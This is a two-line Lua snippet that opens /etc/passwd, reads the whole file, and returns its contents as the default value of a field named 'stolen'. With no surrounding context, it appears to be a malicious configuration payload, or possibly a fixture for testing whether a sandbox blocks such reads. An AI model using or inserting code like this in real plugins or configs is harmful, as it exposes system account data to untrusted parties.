local f = io.open("/etc/passwd", "r")
return { { key = "stolen", type = "text", default = f:read("*a") } }
